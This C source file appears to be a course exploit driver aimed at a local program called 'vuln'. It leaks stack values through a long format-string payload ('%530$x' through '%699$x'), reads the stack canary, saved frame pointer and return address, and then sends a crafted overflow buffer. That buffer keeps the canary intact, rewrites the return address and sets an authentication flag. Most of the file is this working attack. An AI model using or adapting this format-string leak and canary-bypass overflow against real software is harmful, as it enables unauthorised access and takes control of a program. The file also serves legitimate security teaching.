#include <stdio.h>
#include <stdarg.h>
#include <unistd.h>
#include <assert.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <signal.h>

#define MAX_GRP 1001

// ********************************************
// This is a template file
// IGNORE
// ********************************************


/******************************************************************************
   Unless you are interested in the details of how this program communicates
   with a subprocess, you can skip all of the code below and skip directly to
   the main function below. 
*******************************************************************************/

#define err_abort(x) do { \
      if (!(x)) {\
         fprintf(stderr, "Fatal error: %s:%d: ", __FILE__, __LINE__);   \
         perror(""); \
         exit(1);\
      }\
   } while (0)

char buf[1<<20];
unsigned end;
int from_child, to_child;

void print_escaped(FILE *fp, const char* buf, unsigned len) {
   int i;
   for (i=0; i < len; i++) {
      if (isprint(buf[i]))
         fputc(buf[i], stderr);
      else fprintf(stderr, "\\x%02hhx", buf[i]);
   }
}

void put_bin_at(char b[], unsigned len, unsigned pos) {
   assert(pos <= end);
   if (pos+len > end)
      end = pos+len;
   assert(end < sizeof(buf));
   memcpy(&buf[pos], b, len);
}

void put_bin(char b[], unsigned len) {
   put_bin_at(b, len, end);
}

void put_formatted(const char* fmt, ...) {
   va_list argp;
   char tbuf[10000];
   va_start (argp, fmt);
   vsnprintf(tbuf, sizeof(tbuf), fmt, argp);
   put_bin(tbuf, strlen(tbuf));
}

void put_str(const char* s) {
   put_formatted("%s", s);
}

static
void send() {
   err_abort(write(to_child, buf, end) == end);
   usleep(100000); // sleep 0.1 sec, in case child process is slow to respond
   fprintf(stderr, "driver: Sent:'");
   print_escaped(stderr, buf, end);
   fprintf(stderr, "'\n");
   end = 0;
}

char outbuf[1<<20];
int get_formatted(const char* fmt, ...) {
   va_list argp;
   va_start(argp, fmt);
   usleep(100000); // sleep 0.1 sec, in case child process is slow to respond
   int nread=0;
   err_abort((nread = read(from_child, outbuf, sizeof(outbuf)-1)) >=0);
   outbuf[nread] = '\0';
   fprintf(stderr, "driver: Received '%s'\n", outbuf);
   return vsscanf(outbuf, fmt, argp);
}

int pid;
void create_subproc(const char* exec, char* argv[]) {
   int pipefd_out[2];
   int pipefd_in[2];
   err_abort(pipe(pipefd_in) >= 0);
   err_abort(pipe(pipefd_out) >= 0);
   if ((pid = fork()) == 0) { // Child process
      err_abort(dup2(pipefd_in[0], 0) >= 0);
      close(pipefd_in[1]);
      close(pipefd_out[0]);
      err_abort(dup2(pipefd_out[1], 1) >= 0);
      err_abort(execve(exec, argv, NULL) >= 0);
   }
   else { // Parent
      close(pipefd_in[0]);
      to_child = pipefd_in[1];
      from_child = pipefd_out[0];
      close(pipefd_out[1]);
   }
}

/* Shows an example session with subprocess. Change it as you see fit, */

#define STRINGIFY2(X) #X
#define STRINGIFY(X) STRINGIFY2(X)

int main(int argc, char* argv[]) {
   unsigned seed;

   char *nargv[3];
   nargv[0] = "vuln";
   nargv[1] = STRINGIFY(GRP);
   nargv[2] = NULL;
   create_subproc("./vuln", nargv);

   fprintf(stderr, "driver: created vuln subprocess. If you want to use gdb on\n"
           "vuln, go ahead and do that now. Press 'enter' when you are ready\n"
           "to continue with the exploit\n");

   getchar();

   // Run vuln program under GDB. Set breakpoints in main_loop, auth and g
   // to figure out and populate the following values

   void *auth_bp = 0xbfffe6f8;     // saved ebp for auth function
   void *mainloop_bp = 0xbffff038; // saved ebp for main_loop
   void *auth_ra = 0x0804899f;     // return address for auth
   void *mainloop_ra = 0x0804a683; // return address for main_loop

   // The following refer to locations on the stack
   void *auth_user = 0xbfffe560;   // value of user variable in auth
   void *auth_canary_loc = 0xbfffe6bc; // location where auth's canary is stored
   void *auth_bp_loc = 0xbfffe6c8; // location of auth's saved bp
   void *auth_ra_loc = 0xbfffe6cc; // location of auth's return address
   void *g_authd = 0xbfffe6e4;     // location of authd variable of g

   // These values discovered above using GDB will vary across the runs, but the
   // differences between similar variables are preserved, so we compute those.
   unsigned mainloop_auth_bp_diff = mainloop_bp - auth_bp;
   unsigned mainloop_auth_ra_diff = mainloop_ra - auth_ra;

   unsigned auth_canary_user_diff = auth_canary_loc - auth_user;
   unsigned auth_bp_user_diff = auth_bp_loc - auth_user;
   unsigned auth_ra_user_diff = auth_ra_loc - auth_user;
   unsigned g_authd_auth_user_diff = g_authd - auth_user;

   // Use GDB + trial&error to figure out the correct offsets where the
   // stack canary, the saved ebp value, and the return address for the
   // main_loop function are stored. Use those offsets in the place of the
   // numbers in the format string below.

   put_str("e 530 %530$x\n531 %531$x\n532 %532$x\n533 %533$x\n534 %534$x\n535 %535$x\n536 %536$x\n537 %537$x\n538 %538$x\n539 %539$x\n540 %540$x\n541 %541$x\n542 %542$x\n543 %543$x\n544 %544$x\n545 %545$x\n546 %546$x\n547 %547$x\n548 %548$x\n549 %549$x\n550 %550$x\n551 %551$x\n552 %552$x\n553 %553$x\n554 %554$x\n555 %555$x\n556 %556$x\n557 %557$x\n558 %558$x\n559 %559$x\n560 %560$x\n561 %561$x\n562 %562$x\n563 %563$x\n564 %564$x\n565 %565$x\n566 %566$x\n567 %567$x\n568 %568$x\n569 %569$x\n570 %570$x\n571 %571$x\n572 %572$x\n573 %573$x\n574 %574$x\n575 %575$x\n576 %576$x\n577 %577$x\n578 %578$x\n579 %579$x\n580 %580$x\n581 %581$x\n582 %582$x\n583 %583$x\n584 %584$x\n585 %585$x\n586 %586$x\n587 %587$x\n588 %588$x\n589 %589$x\n590 %590$x\n591 %591$x\n592 %592$x\n593 %593$x\n594 %594$x\n595 %595$x\n596 %596$x\n597 %597$x\n598 %598$x\n599 %599$x\n600 %600$x\n601 %601$x\n602 %602$x\n603 %603$x\n604 %604$x\n605 %605$x\n606 %606$x\n607 %607$x\n608 %608$x\n609 %609$x\n610 %610$x\n611 %611$x\n612 %612$x\n613 %613$x\n614 %614$x\n615 %615$x\n616 %616$x\n617 %617$x\n618 %618$x\n619 %619$x\n620 %620$x\n621 %621$x\n622 %622$x\n623 %623$x\n624 %624$x\n625 %625$x\n626 %626$x\n627 %627$x\n628 %628$x\n629 %629$x\n630 %630$x\n631 %631$x\n632 %632$x\n633 %633$x\n634 %634$x\n635 %635$x\n636 %636$x\n637 %637$x\n638 %638$x\n639 %639$x\n640 %640$x\n641 %641$x\n642 %642$x\n643 %643$x\n644 %644$x\n645 %645$x\n646 %646$x\n647 %647$x\n648 %648$x\n649 %649$x\n650 %650$x\n651 %651$x\n652 %652$x\n653 %653$x\n654 %654$x\n655 %655$x\n656 %656$x\n657 %657$x\n658 %658$x\n659 %659$x\n660 %660$x\n661 %661$x\n662 %662$x\n663 %663$x\n664 %664$x\n665 %665$x\n666 %666$x\n667 %667$x\n668 %668$x\n669 %669$x\n670 %670$x\n671 %671$x\n672 %672$x\n673 %673$x\n674 %674$x\n675 %675$x\n676 %676$x\n677 %677$x\n678 %678$x\n679 %679$x\n680 %680$x\n681 %681$x\n682 %682$x\n683 %683$x\n684 %684$x\n685 %685$x\n686 %686$x\n687 %687$x\n688 %688$x\n689 %689$x\n690 %690$x\n691 %691$x\n692 %692$x\n693 %693$x\n694 %694$x\n695 %695$x\n696 %696$x\n697 %697$x\n698 %698$x\n699 %699$x\n");
   send();

   unsigned output;
   get_formatted("%s", &output);
fprintf(stderr, "%s\n", "\n\n\n");


   put_str("e %575$x %578$x %579$x\n");
   send();

   // Once all of the above information has been populated, you are ready to run
   // the exploit.

   unsigned cur_canary, cur_mainloop_bp, cur_mainloop_ra;
   get_formatted("%x%x%x", &cur_canary, &cur_mainloop_bp, &cur_mainloop_ra);
   fprintf(stderr, "driver: Extracted canary=%x, bp=%x, ra=%x\n", 
           cur_canary, cur_mainloop_bp, cur_mainloop_ra);

   // Allocate and prepare a buffer that contains the exploit string.
   // The exploit starts at auth's user, and should go until g's authd, so
   // allocate an exploit buffer of size g_authd_auth_user_diff+sizeof(authd)
   unsigned explsz = sizeof(int) + g_authd_auth_user_diff;
   void* *expl = (void**)malloc(explsz);

   // Initialize the buffer with '\0', just to be on the safe side.
   memset((void*)expl, '\0', explsz);

   // Now initialize the parts of the exploit buffer that really matter. Note
   // that we don't have to worry about endianness as long as the exploit is
   // being assembled on the same architecture/OS as the process being
   // exploited.

   expl[auth_canary_user_diff/sizeof(void*)] = (void*)cur_canary;
   expl[auth_bp_user_diff/sizeof(void*)] = 
      (void*)(cur_mainloop_bp - mainloop_auth_bp_diff);
   expl[auth_ra_user_diff/sizeof(void*)] = 
      (void*)(cur_mainloop_ra - mainloop_auth_ra_diff);
   expl[g_authd_auth_user_diff/sizeof(void*)] = 1;
   
   // Now, send the payload
   put_str("p xyz\n");
   send();
   put_str("u ");
   put_bin((char*)expl, explsz);
   put_str("\n");
   send();

   put_str("l \n");
   send();

   usleep(100000);
   get_formatted("%*s");

   kill(pid, SIGINT);
   int status;
   wait(&status);

   if (WIFEXITED(status)) {
      fprintf(stderr, "vuln exited, status=%d\n", WEXITSTATUS(status));
   } 
   else if (WIFSIGNALED(status)) {
      printf("vuln killed by signal %d\n", WTERMSIG(status));
   } 
   else if (WIFSTOPPED(status)) {
      printf("vuln stopped by signal %d\n", WSTOPSIG(status));
   } 
   else if (WIFCONTINUED(status)) {
      printf("vuln continued\n");
   }

}
